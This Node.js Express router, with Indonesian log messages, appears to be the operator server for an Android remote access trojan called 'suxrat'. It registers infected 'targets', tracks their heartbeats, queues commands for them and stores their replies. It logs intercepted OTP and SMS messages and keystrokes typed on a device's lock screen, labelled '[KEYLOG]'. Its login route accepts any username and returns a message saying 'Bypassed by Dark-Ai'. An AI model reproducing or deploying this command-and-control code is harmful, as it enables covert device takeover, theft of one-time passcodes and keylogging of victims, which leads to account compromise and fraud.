const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');

// Database files - absolute paths
const DATA_ROOT = path.join(__dirname, '../data/suxrat');
const TARGETS_FILE = path.join(DATA_ROOT, 'targets.json');
const NOTIF_FILE = path.join(DATA_ROOT, 'notifications.json');
const COMMANDS_FILE = path.join(DATA_ROOT, 'commands.json');
const RESPONSES_FILE = path.join(DATA_ROOT, 'responses.json');

const readData = (file) => {
    if (!fs.existsSync(file)) return [];
    try {
        const content = fs.readFileSync(file, 'utf8');
        return JSON.parse(content || '[]');
    } catch (e) { return []; }
};

const saveData = (file, data) => {
    try {
        fs.writeFileSync(file, JSON.stringify(data, null, 2));
    } catch (e) { console.log(`[!] Gagal simpan database: ${file}`, e); }
};

// Get IO instance (will be set by index.js)
let io = null;
const setIO = (ioInstance) => { io = ioInstance; };

const emitRealtime = (event, data) => {
    if (io) {
        io.to('suxrat').emit(event, data);
    }
};

// Heartbeat endpoint
router.post('/api/heartbeat/:id', (req, res) => {
    const targetId = req.params.id;
    let targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === targetId);
    if (index !== -1) {
        targets[index].lastSeen = new Date();
        targets[index].status = "Online";
        saveData(TARGETS_FILE, targets);
        emitRealtime('target-updated', { id: targetId, status: 'Online', lastSeen: targets[index].lastSeen });
    }
    res.status(200).send('1');
});

// Register target
router.post('/api/register-target', (req, res) => {
    const deviceData = req.body;
    let targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === deviceData.id);
    if (index !== -1) {
        targets[index] = { ...targets[index], ...deviceData, lastSeen: new Date() };
    } else {
        targets.push({ ...deviceData, lastSeen: new Date() });
    }
    saveData(TARGETS_FILE, targets);
    emitRealtime('target-registered', { id: deviceData.id, ...deviceData });
    res.json({ status: 'ok' });
});

// List targets
router.get('/api/list-targets', (req, res) => {
    const targets = readData(TARGETS_FILE);
    res.json(targets);
});

// Post notification
router.post('/api/post-notification/:id', (req, res) => {
    const targetId = req.params.id;
    let allNotifs = readData(NOTIF_FILE);
    if(req.body.category === "OTP/SMS") {
        console.log(`[intercept] SMS CURIAN: ${req.body.title} -> ${req.body.body}`);
    }
    allNotifs.unshift({ targetId, ...req.body, timestamp: new Date() });
    if (allNotifs.length > 500) allNotifs = allNotifs.slice(0, 500);
    saveData(NOTIF_FILE, allNotifs);
    console.log(`[NOTIF] Data masuk dari Target: ${targetId}`);
    emitRealtime('new-notification', { targetId, ...req.body });
    res.json({ status: 'saved' });
});

// Get notifications
router.get('/api/get-notifications/:id', (req, res) => {
    const allNotifs = readData(NOTIF_FILE);
    const filtered = allNotifs.filter(n => n.targetId === req.params.id);
    res.json(filtered);
});

// Send command
router.post('/api/send-command', (req, res) => {
    const { id, command, extra } = req.body;
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== id);
    commands.push({ targetId: id, command, extra, timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[CMD] Operator -> ${id}: ${command}`);
    emitRealtime('command-sent', { id, command, extra });
    res.json({ status: 'queued' });
});

// Get command
router.get('/api/get-command/:id', (req, res) => {
    const targetId = req.params.id;
    let commands = readData(COMMANDS_FILE);
    const cmdIndex = commands.findIndex(c => c.targetId === targetId);
    if (cmdIndex !== -1) {
        const cmd = commands[cmdIndex];
        commands.splice(cmdIndex, 1);
        saveData(COMMANDS_FILE, commands);
        return res.json(cmd);
    }
    res.status(204).send();
});

// Post response
router.post('/api/post-response/:id', (req, res) => {
    const targetId = req.params.id;
    const { cmd, data } = req.body;
    let responses = readData(RESPONSES_FILE);
    if(cmd === "lock_key_attempt" || cmd === "lock_input_log") {
        console.log(`[KEYLOG] Target ${targetId} mengetik: ${data.input || data.attempt}`);
    }
    const index = responses.findIndex(r => r.targetId === targetId);
    const newRes = { targetId, cmd, data, timestamp: new Date() };
    if (index !== -1) responses[index] = newRes;
    else responses.push(newRes);
    saveData(RESPONSES_FILE, responses);
    console.log(`[!] Respon ${cmd} diterima dari ${targetId}`);
    emitRealtime('response-received', { targetId, cmd, data });
    res.json({ status: 'received' });
});

// Get response
router.get('/api/get-response/:id', (req, res) => {
    const responses = readData(RESPONSES_FILE);
    const resData = responses.find(r => r.targetId === req.params.id);
    res.json(resData || {});
});

// Login bypass
router.post('/api/login', (req, res) => {
    console.log(`[LOGIN] Bypass attempt for user: ${req.body.username}`);
    res.json({ status: 'ok', message: 'Bypassed by Dark-Ai' });
});

module.exports = { router, setIO };
